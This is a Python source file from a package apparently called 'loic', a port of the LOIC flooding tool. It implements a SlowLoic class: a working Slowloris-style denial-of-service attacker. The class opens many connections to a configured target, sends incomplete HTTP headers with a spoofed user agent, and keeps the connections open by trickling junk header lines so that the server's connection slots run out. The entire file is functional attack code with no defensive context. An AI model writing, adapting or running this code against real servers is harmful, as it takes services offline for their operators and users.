from __future__ import annotations

import asyncio
import logging
import socket
import ssl
import time

from loic.flooders.base import AsyncFlooder
from loic.config import AttackConfig
from loic.functions import random_string
from loic.req_state import ReqState

logger = logging.getLogger(__name__)


class SlowLoic(AsyncFlooder):
    def __init__(self, config: AttackConfig):
        super().__init__()
        self.dns = config.effective_host()
        self.ip = config.target_ip
        self.port = config.port
        self.subsite = config.subsite
        self.n_sockets = config.socks_per_thread
        self.timeout = 30000 if config.timeout <= 0 else config.timeout * 1000
        self._delay = config.delay
        self.random_sub = config.random_sub
        self.use_get = config.use_get
        self.use_gzip = config.allow_gzip
        self.ipv6 = config.ipv6
        self.use_tls = config.use_tls
        self.is_delayed = True
        self._sockets: list = []
        self._rand_cmds = True

    async def _run(self):
        family = socket.AF_INET6 if self.ipv6 else socket.AF_INET
        delay_sec = self._delay / 1000.0
        timeout_sec = self.timeout / 1000.0

        self.state = ReqState.IDLE
        while self._is_flooding:
            stop_at = time.monotonic() + timeout_sec
            self.state = ReqState.CONNECTING

            while self._is_flooding and self.is_delayed and time.monotonic() < stop_at:
                method = "GET" if self.use_get else "POST"
                sub = self.subsite + (random_string() if self.random_sub else "")
                gzip_h = "Accept-Encoding: gzip,deflate\r\n" if self.use_gzip else ""
                header = (
                    f"{method} {sub} HTTP/1.1\r\n"
                    f"Host: {self.dns}\r\n"
                    f"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\r\n"
                    f"Keep-Alive: 300\r\n"
                    f"Connection: keep-alive\r\n"
                    f"Content-Length: 42\r\n"
                    f"{gzip_h}\r\n"
                ).encode("ascii")

                try:
                    reader, writer = await asyncio.wait_for(
                        asyncio.open_connection(self.ip, self.port, family=family),
                        timeout=timeout_sec,
                    )
                    writer.write(header)
                    await writer.drain()

                    self._sockets.append((reader, writer))
                    self.requested += 1
                except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                    pass

                self.is_delayed = len(self._sockets) < self.n_sockets
                if self._is_flooding and self.is_delayed and delay_sec > 0:
                    await asyncio.sleep(delay_sec)

            self.state = ReqState.REQUESTING

            tbuf = f"X-a: b{random_string() if self._rand_cmds else ''}\r\n".encode("ascii")

            for i in range(len(self._sockets) - 1, -1, -1):
                if not self._is_flooding:
                    break
                try:
                    _, writer = self._sockets[i]
                    writer.write(tbuf)
                    await writer.drain()
                    self.downloaded += 1
                except (ConnectionResetError, BrokenPipeError, OSError):
                    try:
                        self._sockets[i][1].close()
                    except Exception:
                        pass
                    self._sockets.pop(i)
                    self.failed += 1
                    self.requested -= 1

            self.state = ReqState.COMPLETED
            self.is_delayed = len(self._sockets) < self.n_sockets
            if not self.is_delayed:
                await asyncio.sleep(timeout_sec)

    async def cleanup(self):
        for reader, writer in self._sockets:
            try:
                writer.close()
                await writer.wait_closed()
            except Exception:
                pass
        self._sockets.clear()
        self.state = ReqState.IDLE
        self.is_delayed = True